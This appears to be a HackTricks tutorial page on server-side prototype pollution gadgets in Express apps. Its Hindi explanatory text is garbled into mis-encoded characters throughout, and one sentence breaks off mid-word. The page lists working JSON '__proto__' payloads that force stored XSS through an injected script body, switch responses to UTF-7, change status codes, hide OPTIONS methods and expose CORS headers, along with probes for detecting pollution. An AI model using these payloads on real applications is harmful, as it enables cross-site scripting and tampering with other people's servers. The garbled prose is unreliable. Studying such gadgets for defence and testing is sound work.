# Express Prototype Pollution Gadgets

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos **рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред**

</details>

## Serve XSS responses

**рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП [рдореВрд▓ рдЕрдиреБрд╕рдВрдзрд╛рди рдХреЛ рджреЗрдЦреЗрдВ](https://portswigger.net/research/server-side-prototype-pollution)**

### Change JSON content-type to HTML

рдПрдХ Express рдРрдк рдореЗрдВ **JSON content type response** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдФрд░ рдПрдХ JSON рдХреЛ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХрд░рддреЗ рд╣реБрдП:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
рдЗрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ XSS рдПрдХ JSON рд╕рд╛рдордЧреНрд░реА рдкреНрд░рдХрд╛рд░ рдХреЗ рд╕рд╛рде рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрдпреВрд╢рди рдХреЗ рд╕рд╛рде рд╣рдо **Express рдХреЛ рдПрдХ HTML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЧрдбрд╝рдмрдбрд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВред** рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдЙрди рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдЬреЛ **`res.send(obj)`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдФрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди/json рд╕рд╛рдордЧреНрд░реА рдкреНрд░рдХрд╛рд░ рдХреЗ рд╕рд╛рде рдмреЙрдбреА рдкрд╛рд░реНрд╕рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВред
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
**рдкреНрд░рджреВрд╖рдг** рдХрд░рдХреЗ **`body`** рдФрд░ **`_body`** рдЧреБрдгреЛрдВ рдХреЛ рджреВрд╖рд┐рдд рдХрд░рдиреЗ рд╕реЗ, **Express рдХреЛ HTML рд╕рд╛рдордЧреНрд░реА рдкреНрд░рдХрд╛рд░ рдХреА рд╕реЗрд╡рд╛ рдХрд░рдиреЗ** рдФрд░ **_body** рдЧреБрдг рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕реНрдерд╛рдпреА XSS рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### рдпреВрдЯреАрдПрдл-7 рд░реЗрдВрдбрд░ рдХрд░реЗрдВ

Express рдХреЛ **рдпреВрдЯреАрдПрдл-7 рд╕рд╛рдордЧреНрд░реА рд░реЗрдВрдбрд░ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## рд╕реБрд░рдХреНрд╖рд┐рдд рд╕реНрдХреИрдирд┐рдВрдЧ рддрдХрдиреАрдХ

### JSON рдЕрдВрддрд░рд┐рдХреНрд╖

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд PP рдПрдХ JSON рдХреЗ рдЕрдВрджрд░ рд╡рд┐рд╢реЗрд╖ рдЕрдВрддрд░рд┐рдХреНрд╖ рд╡рд╛рд▓реЗ рдЧреБрдг рдмрдирд╛рдПрдЧрд╛ рдЬреЛ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ рдирд╣реАрдВ рддреЛрдбрд╝реЗрдЧрд╛:
```json
{"__proto__":{"json spaces": " "}}
```
рдлрд┐рд░ рдПрдХ рдкрд░рд╛рд╡рд░реНрддрд┐рдд JSON рдЗрд╕ рддрд░рд╣ рджрд┐рдЦреЗрдЧрд╛:
```json
{"foo":  "bar"} -- Note the extra space
```
### рдЙрдЬрд╛рдЧрд░рд┐рдд рд╣реЗрдбрд░

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд PP рдЧреИрдЬреЗрдЯ рд╕рд░реНрд╡рд░ рдХреЛ рд╡рд╛рдкрд╕ HTTP рд╣реЗрдбрд░ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдПрдЧрд╛: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
рдЗрд╕реЗ **CORS рдореЙрдбреНрдпреВрд▓ рдХреЛ рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**

### **OPTIONS рд╡рд┐рдзрд┐**

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде, **OPTIONS рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдПрдХ рд╡рд┐рдзрд┐ рдЫреБрдкрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **рд╕реНрдерд┐рддрд┐**

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд PP рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╡рд╛рдкрд╕реА рд╕реНрдерд┐рддрд┐ рдХреЛрдб** рдмрджрд▓рдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```json
{"__proto__":{"status":510}}
```
### рддреНрд░реБрдЯрд┐

рдЬрдм рдЖрдк рдПрдХ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдХреЛ рдПрдХ рдкреНрд░рд╛рдердорд┐рдХ рдЬреИрд╕реЗ рдХрд┐ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рд╕рд╛рде рдЕрд╕рд╛рдЗрди рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдПрдХ **рдиреЛ-рдСрдк рдСрдкрд░реЗрд╢рди рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдХреЛ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП**ред рдпрджрд┐ рдЖрдк `Object.prototype` рдХреЛ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдСрдмреНрдЬреЗрдХреНрдЯ рдЕрд╕рд╛рдЗрди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ **рдПрдХ рдЕрдкрд╡рд╛рдж рдлреЗрдВрдХреЗрдЧрд╛**ред рд╣рдо рдЗрди рджреЛ рд╡реНрдпрд╡рд╣рд╛рд░реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╣рдо **рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реВрд╢рди рд╕рдлрд▓ рд░рд╣рд╛ рд╣реИ**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдорд╛рди

рдЬрдм рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЕрдкрдиреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ, рддреЛ `__proto__` рдХреЗ рд╕рд╛рде **рдЕрд╕рд╛рдорд╛рдиреНрдп рдирд╛рдо рдХреЗ рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рдмрдирд╛рдирд╛** рджреЗрдЦрдиреЗ рд▓рд╛рдпрдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, рдЕрдЧрд░ **рдХреЗрд╡рд▓ рдЕрд╕рд╛рдорд╛рдиреНрдп рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рд╣реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╡рд╛рдкрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рддреЛ рдпрд╣ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдХрдордЬреЛрд░реА рдХрд╛ рд╕рдВрдХреЗрдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:
```json
{"unusualName":"value","__proto__":"test"}
```
рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдРрд╕реЗ рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдБ рдПрдХ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдЬреИрд╕реЗ Lodash рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг (PP) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдФрд░ рд╕реАрдзреЗ рд╡рд╕реНрддреБ рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╕рдВрдкрддреНрддрд┐ рд╕реЗрдЯ рдХрд░рдирд╛ рдПрдХ рдФрд░ рдиреИрджрд╛рдирд┐рдХ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рдРрд╕реА рдХреЛрдИ рд╕рдВрдкрддреНрддрд┐ рдкреНрд░рддрд┐рд╕рд╛рдж рд╕реЗ рдЫреВрдЯ рдЬрд╛рддреА рд╣реИ, рддреЛ рдпрд╣ рд╕реБрдЭрд╛рд╡ рджреЗрддрд╛ рд╣реИ рдХрд┐ Lodash рд▓рдХреНрд╖рд┐рдд рд╡рд╕реНрддреБ рдореЗрдВ рд╕рдВрдкрддреНрддрд┐ рдХреА рдореМрдЬреВрджрдЧреА рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░ рд░рд╣рд╛ рд╣реИ рдкрд╣рд▓реЗ рд╕реЗ рдкрд╣рд▓реЗ рдорд┐рд▓рд╛рдиреЗ рд╕реЗ:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## рд╡рд┐рд╡рд┐рдз

### рдбреЙрдЯреНрд╕ рдХреА рдЕрдиреБрдорддрд┐

Express рдореЗрдВ рдПрдХ рд╡рд┐рдХрд▓реНрдк рд╣реИ рдЬреЛ рдЖрдкрдХреЛ **рдХреНрд╡реЗрд░реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдкреИрд░рд╛рдореАрдЯрд░ рд╕реЗ рдСрдмреНрдЬ
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` рдиреЛрдб рдореЗрдВ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛рддрд╛ рд╣реИред**

## рд╕рдВрджрд░реНрдн

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)
